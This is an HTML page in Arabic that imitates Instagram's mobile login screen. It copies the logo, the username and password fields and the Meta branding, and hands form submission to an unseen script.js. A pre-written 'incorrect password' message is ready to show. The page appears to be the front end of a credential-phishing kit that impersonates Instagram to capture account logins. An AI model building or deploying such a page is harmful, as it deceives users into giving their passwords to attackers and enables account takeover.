<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #ffffff; 
            color: #000;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
            position: relative;
        }

        /* اختيار اللغة */
        .lang-selector {
            text-align: center;
            margin-top: 20px;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .lang-btn {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
            color: #000;
            font-weight: 500;
            cursor: pointer;
        }
        .lang-btn .arrow-down { font-size: 10px; color: #555; }

        /* اللوجو الملون */
        .insta-logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        /* الحقول */
        .input-group { margin-bottom: 12px; }
        .input-box {
            width: 100%;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 18px 15px;
            color: #000;
            font-size: 15px;
            outline: none;
            transition: 0.2s;
        }
        .input-box:focus { border: 1px solid #a0a0a0; }
        .input-box::placeholder { color: #8e8e8e; }

        /* زرار الدخول */
        .login-btn {
            background: #0064e0;
            color: #fff;
            border: none;
            border-radius: 25px;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
        }
        .login-btn:disabled { background: #b2dffc; cursor: not-allowed; }

        .forgot-pass {
            text-align: center;
            margin-top: 25px;
            font-size: 15px;
            color: #000;
            font-weight: 500;
        }

        /* زرار إنشاء حساب */
        .signup-btn {
            background: transparent;
            color: #0064e0;
            border: 1px solid #0064e0;
            border-radius: 25px;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            width: calc(100% - 40px);
            cursor: pointer;
            position: absolute;
            bottom: 80px;
            left: 20px;
        }

        /* شعار ميتا */
        .meta-logo {
            position: absolute;
            bottom: 25px;
            width: 100%;
            text-align: center;
            left: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .meta-logo img {
            height: 18px;
        }
        
        .error-msg {
            color: #ed4956;
            text-align: center;
            font-size: 14px;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="lang-selector">
        <div class="lang-btn">
            <span>العربية</span>
            <span class="arrow-down">▼</span>
        </div>
    </div>

    <div class="insta-logo-container">
        <svg xmlns="http://www.w3.org/2000/svg" width="70" height="70" viewBox="0 0 24 24">
            <defs>
                <radialGradient id="ig-grad" cx="30%" cy="107%" r="150%">
                    <stop offset="0%" stop-color="#fdf497" />
                    <stop offset="5%" stop-color="#fdf497" />
                    <stop offset="45%" stop-color="#fd5949" />
                    <stop offset="60%" stop-color="#d6249f" />
                    <stop offset="90%" stop-color="#285AEB" />
                </radialGradient>
            </defs>
            <path fill="url(#ig-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
        </svg>
    </div>

    <form id="loginForm">
        <div class="input-group">
            <input type="text" id="username" class="input-box" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" class="input-box" placeholder="كلمة السر" required>
        </div>
        <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
    </form>

    <div class="error-msg" id="errorMsg">عذراً، كلمة السر غير صحيحة.</div>

    <div class="forgot-pass">هل نسيت كلمة السر؟</div>

    <button class="signup-btn">إنشاء حساب جديد</button>

    <!-- شعار ميتا في مكانه تحت خالص -->
    <div class="meta-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
    </div>

    <script src="script.js"></script>
</body>
</html>
